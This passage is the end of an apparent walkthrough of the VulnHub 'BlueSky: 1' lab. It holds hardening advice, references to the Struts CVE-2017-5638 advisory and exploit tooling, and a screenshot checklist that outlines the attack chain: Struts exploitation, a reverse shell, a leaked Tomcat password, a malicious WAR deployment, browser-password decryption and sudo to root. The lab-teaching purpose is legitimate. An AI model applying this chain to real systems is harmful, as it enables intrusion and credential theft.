  root-level risk. Scope sudo to exact commands.
- **Assume any file a web user can read will be read.** History files, configs,
  and profile directories all leaked something useful here.
- **Monitor and alert** on anomalous `Content-Type` headers and unexpected WAR
  deployments — both are detectable signals.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub — BlueSky: 1 entry: https://vulnhub.com/entry/bluesky-1,623/
- CVE-2017-5638 (NVD): https://nvd.nist.gov/vuln/detail/CVE-2017-5638
- Apache Struts S2-045 advisory: https://cwiki.apache.org/confluence/display/WW/S2-045
- Metasploit — `struts2_content_type_ognl`: https://www.rapid7.com/db/modules/exploit/multi/http/struts2_content_type_ognl/
- `firefox_decrypt` tool: https://github.com/unode/firefox_decrypt
- `firepwd` tool (alternative): https://github.com/lclevy/firepwd
- John Bush — "Vulnhub — BlueSky 1 Write-up": https://jhnbsh.medium.com/vulnhub-bluesky-1-write-up-4f16171e3c1e
- NepCodeX — "BlueSky Walkthrough": https://nepcodex.com/2021/07/bluesky-walkthrough-vulnhub-writeup/
- tyskill — "[vulnhub] BlueSky_1": https://tyskill.github.io/posts/vulnhub_bluesky_1/

---

## 8. Screenshot checklist

Capture these as you go so you can reproduce the writeup with images. Save them
in `images/` with the filenames used in this document.

- [ ] `images/01-netdiscover.png` — `arp-scan`/`netdiscover` showing `192.168.56.101`
- [ ] `images/02-gobuster.png` — gobuster discovering `/struts2-showcase`
- [ ] `images/03-reverse-shell.png` — the Meterpreter/netcat shell as `minhtuan`
- [ ] `images/04-root-shell.png` — `id` showing `uid=0(root)` and `/root/root.txt`
- [ ] `images/05-nmap.png` — nmap showing SSH (22) and Tomcat (8080)
- [ ] `images/06-struts-cve.png` — Nmap CVE script or Nikto confirming CVE-2017-5638
- [ ] `images/07-tomcat-users.png` — `tomcat-users.xml` leaking the manager password
- [ ] `images/08-war-deploy.png` — deploying `reverse.war` in the Tomcat Manager
- [ ] `images/09-firefox-key4.png` — the `key4.db` / `logins.json` files
- [ ] `images/10-firefox-decrypt.png` — `firefox_decrypt` revealing `skysayohyeah`
- [ ] `images/11-sudo-l.png` — `sudo -l` / `groups` showing sudo membership

---

*BlueSky: 1 is a great "second box": it teaches you to look past the default
wordlists, recognises a real-world CVE, and ends with a very human failure —
a saved browser password and an over-privileged account. Try to solve each stage
yourself before reading ahead.*
